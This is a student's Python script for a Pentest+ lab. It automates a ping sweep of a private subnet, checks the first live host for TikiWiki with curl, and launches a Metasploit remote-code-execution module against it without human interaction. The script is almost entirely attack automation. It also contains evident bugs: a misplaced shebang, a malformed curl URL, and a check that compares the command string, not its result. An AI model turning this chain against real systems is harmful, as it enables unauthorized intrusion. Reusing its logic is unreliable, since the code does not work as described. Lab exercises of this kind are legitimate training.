#April Parker
#CSIT 188 Pentest+
# The goal was to have the script be 100% automated with no human interaction
#This script is meant to run in a Virtual Environment with a Metasploit (attacker vm) with several potential victim VMs. 
#The script will scan the subnet and locate a system where the tikiwiki vulnerability exist and exploit it. 

#!/user/bin/env python
import os

#I dont know what machine is vulnerable so I hardcoded the first 3 octets of the subnet
subnet="192.168.68."

#Ping Sweep - What systems are alive - I added the 10-15 range to scan due to speed
for octetFour in range(10,15):
	ip=subnet + str(octetFour)
	print 'Checking ' + ip
	pingCall="ping -c1 " + ip + " >> ping.txt"
	os.system(pingCall)

#System Calls - outputting in ping results were at least 1 packet was recieved
os.system("cat ping.txt | grep -B1 '1 received' >> pingresults.txt")

#Read Ping Results, Output victim's IP
f=open('pingresults.txt')
victimIP=f.readline(18).split('--- ', 1)[-1]
print "Victim's IP: " + victimIP

#Pull tikiwiki from html file being served at victim's IP
flag="curl -s http:// " + victimIP + "| grep -c 'tikiwiki'"
os.system(flag)

if flag > 0:
	print "Starting msfconsole...please wait"
	os.system("msfconsole -q -x 'use exploit/unix/webapp/tikiwiki_graph_formula_exec;set rhost %s; exploit;'"%victimIP)
else:
	print "tikiwiki not found"